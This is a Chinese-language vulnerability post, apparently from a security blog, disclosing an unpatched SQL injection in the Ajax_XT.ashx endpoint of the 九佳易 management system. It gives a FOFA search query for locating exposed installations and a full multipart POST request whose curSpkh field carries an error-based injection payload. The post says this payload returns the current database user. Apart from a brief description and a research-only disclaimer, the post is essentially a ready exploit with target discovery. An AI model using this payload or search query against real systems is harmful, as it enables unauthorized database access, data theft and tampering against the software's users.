#  【0day】九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞  
 0day收割机   2026-02-28 08:35  
  
# 漏洞简介  
  
九佳易管理系统中的 Ajax_XT.ashx 通用处理程序接口存在SQL注入漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。  
# 影响版本  
# fofa语法  
> title="VSQL" && body="/Scripts/Login_A8/"  
  
# 漏洞复现  
> 因为参数获取是通过this.Request["hyh"]  
的方式，因此支持get、post等常规方式外，还支持multipart格式  
  
```
POST /Service/Ajax_XT.ashx HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="curFlag"

PicSord
------WebKitFormBoundary
Content-Disposition: form-data; name="curPxbh"

1,2
------WebKitFormBoundary
Content-Disposition: form-data; name="curSpkh"

'-1/user--
------WebKitFormBoundary--
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWCzFzxRNP5YhXuH4qC6CqtIUGuibjKc8MMvNwJJiblljwB5pOibibJJxggygH1g8akcSzf8G4Qskn7Oe5ibwTfguj3T3gO9YXpD2iaPg/640?wx_fmt=png&from=appmsg "")  
  
成功利用报错注入在响应回显当前数据库用户信息。  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
